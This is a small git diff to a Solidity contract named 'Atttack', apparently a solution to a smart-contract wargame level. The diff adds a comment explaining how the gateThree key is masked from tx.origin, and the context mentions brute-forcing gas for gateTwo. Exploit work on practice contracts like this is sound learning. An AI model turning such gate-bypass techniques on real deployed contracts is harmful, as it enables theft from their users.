@@ -16,7 +16,8 @@ contract Atttack {
     function attack() public {
         // gateThree: 1. cast address into uint160 (since address is 160 bits long)
         // gateThree: 2. cast uint160 into uint64 (since the key passed into the function is bytes8 = 64 bits long)
-        // gateThree: 3. perform AND bitwise operation with the mask then cast the result into bytes8 
+        // gateThree: 3. perform AND bitwise operation with the mask then cast the result into bytes8
+        // b0 b1 b2 b3 must not be zero, b4 b5 should be zero, and b6 b7 should match the last two bytes of tx.origin
         bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
 
         // gateTwo: iterate through an additional gas amounts from 0 to 8190 until (8191*3+i)-gasUsed % 8191 = 0
